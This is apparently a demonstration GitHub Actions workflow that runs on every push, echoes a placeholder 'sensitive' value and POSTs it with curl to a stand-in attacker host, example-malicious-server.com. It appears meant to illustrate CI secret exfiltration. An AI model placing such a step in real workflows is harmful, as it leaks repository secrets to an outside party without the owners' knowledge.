name: Data Exfiltration Demo

on: [push]

jobs:
  exfiltration-demo:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Repository
        uses: actions/checkout@v3

      - name: Demonstrate Data Exfiltration
        env:
          # Ensure you define SENSITIVE_DATA in your repository secrets
          DATA_TO_EXFILTRATE: "123455"
        run: |
          echo "This is a demonstration of a data exfiltration vulnerability."
          echo "Sensitive data: $DATA_TO_EXFILTRATE"
          # Simulate exfiltration: send the sensitive data to an external endpoint
          curl -X POST -d "data=${DATA_TO_EXFILTRATE}" https://example-malicious-server.com/collect
